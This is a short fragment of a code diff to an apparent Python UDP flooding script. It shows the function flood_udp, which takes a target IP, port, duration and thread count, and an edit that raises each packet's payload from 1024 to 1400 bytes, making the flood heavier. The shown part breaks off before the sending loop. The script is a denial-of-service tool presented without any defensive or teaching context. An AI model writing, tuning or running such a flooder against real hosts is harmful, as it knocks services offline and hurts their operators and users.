@@ -3,7 +3,7 @@ import threading
 import time
 
 def flood_udp(ip, port, duration=10, threads=8):
-    payload = b"A" * 1024
+    payload = b"A" * 1400
     end_time = time.time() + duration
 
     def sender():
